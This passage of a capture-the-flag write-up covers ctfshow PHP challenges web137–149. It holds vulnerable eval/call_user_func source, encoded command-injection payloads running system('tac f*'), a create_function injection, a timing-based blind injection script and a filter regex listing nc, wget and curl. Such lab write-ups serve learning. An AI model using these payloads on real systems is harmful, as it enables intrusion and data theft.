class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls|tee 1.txt</span><br><span class=\"line\">ls / |tee 1.txt</span><br><span class=\"line\">cat /f* |1.txt</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web137\"><a href=\"#web137\" class=\"headerlink\" title=\"web137\"></a>web137</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">class ctfshow</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    function __wakeup()&#123;</span><br><span class=\"line\">        die(&quot;private class&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    static function getFlag()&#123;</span><br><span class=\"line\">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">call_user_func($_POST[&#x27;ctfshow&#x27;]); </span><br></pre></td></tr></table></figure>\n\n<p>ctfshowgetFlag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST:ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure>\n\n<p>yu22x</p>\n<blockquote>\n<p>php -&gt;:: <br>-&gt;<br>::.</p>\n<p><strong></strong></p>\n</blockquote>\n<h3 id=\"web138\"><a href=\"#web138\" class=\"headerlink\" title=\"web138\"></a>web138</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">class ctfshow</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    function __wakeup()&#123;</span><br><span class=\"line\">        die(&quot;private class&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    static function getFlag()&#123;</span><br><span class=\"line\">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if(strripos($_POST[&#x27;ctfshow&#x27;], &quot;:&quot;)&gt;-1)&#123;</span><br><span class=\"line\">    die(&quot;private function&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">call_user_func($_POST[&#x27;ctfshow&#x27;]);</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p>call_user_func</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call_user_func(array($classname, &#x27;say_hello&#x27;));</span><br><span class=\"line\"> classname say_hello</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web139\"><a href=\"#web139\" class=\"headerlink\" title=\"web139\"></a>web139</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">function check($x)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;</span><br><span class=\"line\">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c=$_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    check($c);</span><br><span class=\"line\">    exec($c);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import time</span><br><span class=\"line\">import string</span><br><span class=\"line\">str=string.digits+string.ascii_lowercase+&quot;-&quot;</span><br><span class=\"line\">result=&quot;&quot;</span><br><span class=\"line\">key=0</span><br><span class=\"line\">for j in range(1,45):</span><br><span class=\"line\">    print(j)</span><br><span class=\"line\">    if key==1:</span><br><span class=\"line\">        break</span><br><span class=\"line\">    for n in str:</span><br><span class=\"line\">        payload=&quot;if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;.format(j,n)</span><br><span class=\"line\">        #print(payload)</span><br><span class=\"line\">        url=&quot;http://47f5a8e0-42e2-4260-9f27-ec8d922b6561.challenge.ctf.show/?c=&quot;+payload</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            requests.get(url,timeout=(2.5,2.5))</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            result=result+n</span><br><span class=\"line\">            print(result)</span><br><span class=\"line\">            break</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web140\"><a href=\"#web140\" class=\"headerlink\" title=\"web140\"></a>web140</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_POST[&#x27;f1&#x27;]) &amp;&amp; isset($_POST[&#x27;f2&#x27;]))&#123;</span><br><span class=\"line\">    $f1 = (String)$_POST[&#x27;f1&#x27;];</span><br><span class=\"line\">    $f2 = (String)$_POST[&#x27;f2&#x27;];</span><br><span class=\"line\">    if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f1))&#123;</span><br><span class=\"line\">        if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f2))&#123;</span><br><span class=\"line\">            $code = eval(&quot;return $f1($f2());&quot;);</span><br><span class=\"line\">            if(intval($code) == &#x27;ctfshow&#x27;)&#123;</span><br><span class=\"line\">                echo file_get_contents(&quot;flag.php&quot;);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(intval($code) == &#x27;ctfshow&#x27;)</span><br></pre></td></tr></table></figure>\n\n<p>,null</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$code = eval(&quot;return $f1($f2());&quot;); </span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">intval(&#x27;a&#x27;)==0 intval(&#x27;.&#x27;)==0 intval(&#x27;/&#x27;)==0</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">md5(phpinfo())</span><br><span class=\"line\">md5(sleep())</span><br><span class=\"line\">md5(md5())</span><br><span class=\"line\">current(localeconv)</span><br><span class=\"line\">sha1(getcwd())     /var/www/html md5sha1</span><br></pre></td></tr></table></figure>\n\n<p>null</p>\n<h3 id=\"web141\"><a href=\"#web141\" class=\"headerlink\" title=\"web141\"></a>web141</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class=\"line\">        if(preg_match(&#x27;/^\\W+$/&#x27;, $v3))&#123;</span><br><span class=\"line\">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class=\"line\">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p><code>/^\\W+$/</code> ,</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;return 1;phpinfo();&quot;);</span><br></pre></td></tr></table></figure>\n\n<p><code>phpinfo()</code> <code>1-phpinfo();</code>phpinfo()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;return 1-phpinfo();&quot;);//</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v1=1&amp;v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-&amp;v2=1</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web142\"><a href=\"#web142\" class=\"headerlink\" title=\"web142\"></a>web142</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    if(is_numeric($v1))&#123;</span><br><span class=\"line\">        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);</span><br><span class=\"line\">        sleep($d);</span><br><span class=\"line\">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p><code>v1=0</code><code>$d=0</code></p>\n<h3 id=\"web143\"><a href=\"#web143\" class=\"headerlink\" title=\"web143\"></a>web143</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class=\"line\">        if(preg_match(&#x27;/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\&#123;|\\&#125;|\\~|\\%|\\&amp;|\\;/i&#x27;, $v3))&#123;</span><br><span class=\"line\">                die(&#x27;get out hacker!&#x27;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else&#123;</span><br><span class=\"line\">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class=\"line\">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%00&quot;^&quot;%7f%60%60%20%60%2a&quot;)*&amp;v2=1</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web144\"><a href=\"#web144\" class=\"headerlink\" title=\"web144\"></a>web144</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(is_numeric($v1) &amp;&amp; check($v3))&#123;</span><br><span class=\"line\">        if(preg_match(&#x27;/^\\W+$/&#x27;, $v2))&#123;</span><br><span class=\"line\">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class=\"line\">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function check($str)&#123;</span><br><span class=\"line\">    return strlen($str)===1?true:false;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>v1,v2,v3</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v3=-&amp;v2=(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web155\"><a href=\"#web155\" class=\"headerlink\" title=\"web155\"></a>web155</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class=\"line\">        if(preg_match(&#x27;/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\/|\\^|\\#|\\&quot;/i&#x27;, $v3))&#123;</span><br><span class=\"line\">                die(&#x27;get out hacker!&#x27;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else&#123;</span><br><span class=\"line\">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class=\"line\">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>yu22xwp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;return 1?phpinfo():1;&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>phpinfo()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v3=?(~%8F%97%8F%96%91%99%90)():&amp;v2=1</span><br></pre></td></tr></table></figure>\n\n<p>phpinfo()</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v3=?(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5):&amp;v2=1</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web146\"><a href=\"#web146\" class=\"headerlink\" title=\"web146\"></a>web146</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class=\"line\">        if(preg_match(&#x27;/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\/|\\^|\\#|\\&quot;/i&#x27;, $v3))&#123;</span><br><span class=\"line\">                die(&#x27;get out hacker!&#x27;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else&#123;</span><br><span class=\"line\">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class=\"line\">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;return 1==phpinfo()||1;&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>phpinfo()</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v3===(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)||&amp;v2=1</span><br><span class=\"line\"></span><br><span class=\"line\">?v1=1&amp;v3=|(&#x27;%13%19%13%14%05%0d&#x27;|&#x27;%60%60%60%60%60%60&#x27;)(&#x27;%14%01%03%20%06%02&#x27;|&#x27;%60%60%60%20%60%28&#x27;)|&amp;v2=1</span><br><span class=\"line\"></span><br><span class=\"line\">?v1=1&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|&amp;v2=1</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web147\"><a href=\"#web147\" class=\"headerlink\" title=\"web147\"></a>web147</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_POST[&#x27;ctf&#x27;]))&#123;</span><br><span class=\"line\">    $ctfshow = $_POST[&#x27;ctf&#x27;];</span><br><span class=\"line\">    if(!preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;,$ctfshow)) &#123;</span><br><span class=\"line\">        $ctfshow(&#x27;&#x27;,$_GET[&#x27;show&#x27;]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>wp</p>\n<p>create_function()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create_function(&#x27;$a&#x27;,&#x27;echo $a.&quot;123&quot;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">function f($a) &#123;</span><br><span class=\"line\">  echo $a.&quot;123&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p> echo 1;}phpinfo();&#x2F;&#x2F;<br> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function f($a) &#123;</span><br><span class=\"line\">  echo 1;&#125;phpinfo();//</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">phpinfo()</span><br><span class=\"line\">fuzz%5c</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get: ?show=echo 123;&#125;system(&#x27;tac f*&#x27;);//</span><br><span class=\"line\">post: ctf=%5ccreate_function</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web148\"><a href=\"#web148\" class=\"headerlink\" title=\"web148\"></a>web148</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include &#x27;flag.php&#x27;;</span><br><span class=\"line\">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class=\"line\">    $code=$_GET[&#x27;code&#x27;];</span><br><span class=\"line\">    if(preg_match(&quot;/[A-Za-z0-9_\\%\\\\|\\~\\&#x27;\\,\\.\\:\\@\\&amp;\\*\\+\\- ]+/&quot;,$code))&#123;</span><br><span class=\"line\">        die(&quot;error&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @eval($code);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function get_ctfshow_fl0g()&#123;</span><br><span class=\"line\">    echo file_get_contents(&quot;flag.php&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%02&quot;^&quot;%7d%60%60%21%60%28&quot;);</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web149\"><a href=\"#web149\" class=\"headerlink\" title=\"web149\"></a>web149</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span 